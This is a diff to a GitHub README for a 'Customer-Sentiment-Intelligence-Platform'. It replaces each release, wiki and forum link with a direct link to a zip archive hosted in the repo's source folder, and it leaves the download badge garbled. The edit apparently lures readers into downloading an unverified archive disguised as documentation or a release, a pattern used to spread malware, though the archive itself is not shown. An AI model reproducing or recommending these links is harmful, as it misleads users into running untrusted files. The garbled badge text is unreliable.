@@ -2,7 +2,7 @@
 
 ## 💾 Download Now!
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/releases)
+[![Download](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip%20Latest%https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip)](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ Before you begin, make sure your system meets these requirements:
 
 To get started, visit this page to download the latest version of the Customer-Sentiment-Intelligence-Platform:
 
-[Download Latest Release](https://github.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip)
 
 Follow these steps to install the application:
 
@@ -74,11 +74,11 @@ Yes, your data is stored in a local SQLite database. Your information remains on
 
 ## 📑 Additional Resources
 
-- [Documentation](https://github.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/wiki): A detailed guide on all features and functionalities.
-- [Community Forum](https://github.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/discussions): A space for discussions, tips, and user experiences.
+- [Documentation](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip): A detailed guide on all features and functionalities.
+- [Community Forum](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip): A space for discussions, tips, and user experiences.
 
 ## 💻 Concluding Notes
 
 We hope you find the Customer-Sentiment-Intelligence-Platform valuable for your needs. Don't hesitate to reach out for support or feedback. Start analyzing customer feedback today!
 
-[Download Latest Release](https://github.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/releases)
+[Download Latest Release](https://raw.githubusercontent.com/Alex178945918274/Customer-Sentiment-Intelligence-Platform/main/src/Customer-Sentiment-Intelligence-Platform-appet.zip)
